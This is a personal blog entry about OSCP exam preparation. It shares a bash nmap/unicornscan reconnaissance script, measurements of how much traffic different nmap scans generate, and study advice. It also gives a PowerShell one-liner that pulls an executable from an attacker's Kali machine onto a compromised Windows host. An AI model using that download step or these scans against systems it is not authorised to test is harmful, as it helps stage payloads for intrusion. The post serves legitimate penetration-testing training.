---
layout: post
title: OSCP Journey Part 9
date: 2018-08-09 09:50
author: rowbot
comments: true
categories: [Progress Bar]
---
<!-- wp:block {"ref":364} /-->

<!-- wp:paragraph -->
<p>So seven boxes down currently have low priv on the 8th - have spent approx 4 days getting low priv thanks to a sneak port choice. Took a break yesterday from the box to work on an initial scan script that would pick up something like that in future. I would have a lot more boxes completed if I could use metasploit! But I can't rely on it in the exam so I'm not using it in the lab (other than mutli/handler and using the payloads listed in my previous post).</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">#!/bin/bash<br/>if [[ -z "$1" ]]; then<br/>        echo "USAGE: ./scanner.sh [IP ADDRESS}"<br/>        exit 1<br/>fi<br/>ip=$1<br/><br/>echo ---------HAVE YOU BOUNCED THE BOX??----------------<br/>echo FAST NMAP SCAN OF $ip 100 PORTS<br/>nmap $ip -F -oN quick$ip<br/><br/>echo TCP NMAP SCAN ALL PORTS OF $ip<br/>echo if this takes longer than 10 mins re run scan. Possibly restart box.<br/>nmap $ip -p- -sT -oN tcpall$ip -T4 <br/><br/>echo UNICORN SCAN OF ALL PORTS <br/>unicornscan $ip:a > uniall$ip<br/>echo <br/>echo EXTRACTING PORTS FROM quick$ip and tcpall$ip<br/>cat quick$ip tcpall$ip | grep open | cut -d" " -f1 | sort -u<br/>echo<br/>echo VIEWING uniall$ip<br/>cat uniall$ip
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Let me know if you use it/find it useful/suggest ways to improve it.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Even though the Nmap book says -sS scans are quicker, I've found this not to be the case, -sT scans have been quicker for me.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The script gives you a quick scan of the 100 most common ports and outputs that so you can begin working on a box, ie its found a web-server, while the -sT can is running go view the web page etc. The -sT scan run a -T4 has been the most reliable in testing, -T5 has missed ports and T3 (which is the normal scan when you run nmap) is a bit too slow - though very reliable. The unicorn scan is a quick check of the other 2 scans, as its always good to use a different tool to verify findings.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Now I'm sure there are ways to improve this script as its very basic but so far its been quite solid for me. The only thing I would say is that I couldn't figure out how to grep the output of unicornscan.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Some interesting nmap scan stats about scans I've put together</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<table class="wp-block-table"><tbody><tr><td><strong>Scan</strong></td><td><strong>Network impact</strong> </td><td><strong>Against /24</strong> </td></tr><tr><td>nmap –F $ip </td><td>0.005436MB </td><td>1.38MB </td></tr><tr><td>nmap --top-ports 20 $ip</td><td>0.014MB </td><td>3.57MB </td></tr><tr><td>nmap –p- $ip</td><td>2.971MB </td><td>757.60MB </td></tr><tr><td>Nmap –A $ip</td><td>2.399MB </td><td>611.74MB </td></tr><tr><td>Nmap –p 139,443 –script=smb-vuln* $ip</td><td>0.12MB </td><td>30.60MB </td></tr></tbody></table>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>So really think about what scan you want to run on a network because as you can see if scanning a whole range you will definitely affect the network with the load you are putting on.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>My current struggle is Windows priv esc. I've used windows exploit suggester but every exploit I try doesn't work. I'm obviously not doing something correctly, or the Offsec admins have manually patched the vulnerability its suggesting.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Nice script to put files on a windows machine with powershell</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kaliboxip/AFILE.exe','C:\Users\USERYOURLOGGEDINAS\Desktop\AFILE.exe')"</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>To those reading this who have not started or are thinking about it. Seriously take the time to explore hackthebox and vulnhub and really think about the tools your using and the exploits you've used. Refine your method, get very comfortable with nmap, especially the scripting engine. Learn to get stuck and fed up and want to give up - but keep at it until you pwn that box. Document what you have learned from the box - don't think 'its okay i'll remember that'. You won't - believe me. There as been quite a few times I've forgotten something and popped on to where I've documented it on this site as a reminder.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Lastly, I've booked the exam date....and accepted my fate of not passing on this attempt. I will eventually pass this exam I have set my mind to that, I don't care how long it will take me. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I hope this blog helps someone who has read other blogs and how they have pwned all the boxes in 2 days (exaggeration) and passed first time.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":376,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2018/08/madrobot.png" alt="" class="wp-image-376"/></figure></div>
<!-- /wp:image -->
